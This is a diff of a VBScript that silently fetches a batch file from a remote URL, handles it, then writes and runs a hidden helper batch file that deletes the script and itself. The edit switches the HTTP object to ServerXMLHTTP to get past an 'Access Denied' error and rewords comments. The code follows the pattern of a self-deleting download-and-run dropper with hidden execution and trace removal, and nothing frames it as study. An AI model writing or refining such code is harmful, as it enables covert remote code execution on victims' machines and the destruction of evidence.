@@ -17,8 +17,8 @@ If objFSO.FileExists(strTempBat) Then
     objFSO.DeleteFile strTempBat, True
 End If
 
-' Download batch file silently
-Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
+' Create ServerXMLHTTP object instead of XMLHTTP to avoid Access Denied
+Set objXMLHttp = CreateObject("MSXML2.ServerXMLHTTP")
 objXMLHttp.Open "GET", strURL, False
 objXMLHttp.Send
 
@@ -33,16 +33,16 @@ If objXMLHttp.Status = 200 Then
     ' batch file assumed to have internal self-delete code
 End If
 
-' Prepare helper batch file to delete this VBScript
+' Prepare helper batch file to delete this VBScript after it finishes
 strBat = strTempPath & "\del_" & objFSO.GetFileName(WScript.ScriptFullName) & ".bat"
 
 Set objBatFile = objFSO.CreateTextFile(strBat, True)
 objBatFile.WriteLine "@echo off"
-objBatFile.WriteLine "ping 127.0.0.1 -n 3 > nul" ' 2-second delay to ensure script exit
+objBatFile.WriteLine "ping 127.0.0.1 -n 3 > nul" ' 2-second delay to ensure VBScript exits
 objBatFile.WriteLine "del """ & WScript.ScriptFullName & """" ' delete the VBScript file
-objBatFile.WriteLine "del %~f0" ' delete this batch file itself
+objBatFile.WriteLine "del %~f0" ' delete this temporary batch file
 objBatFile.Close
 
-' Run helper batch file hidden and asynchronous (no wait)
+' Run helper batch file hidden asynchronously (no waiting)
 Set wshShell = CreateObject("WScript.Shell")
 wshShell.Run Chr(34) & strBat & Chr(34), 0, False
